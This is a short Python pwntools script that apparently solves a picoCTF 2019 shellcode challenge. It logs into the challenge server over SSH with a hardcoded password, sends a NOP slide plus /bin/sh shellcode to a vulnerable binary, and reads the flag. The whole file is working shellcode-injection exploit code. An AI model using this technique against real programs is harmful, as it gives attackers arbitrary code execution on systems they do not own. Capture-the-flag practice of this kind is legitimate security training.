from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

sc = shellcraft.sh()

asm_sc = asm(sc)

nopSlide = b'\x90'*256

nop_asm_sc = nopSlide + asm_sc

program = session.process(['./vuln'], cwd='/problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0')

program.recvline()

program.sendline(nop_asm_sc)

program.recvline()
program.recvline()
program.recv()

program.sendline('cat flag.txt')

flagInB = program.recv()
flag = flagInB.decode('ascii')
rawFlag = flag[flag.index('{')+1:flag.index('}')]

print(rawFlag)
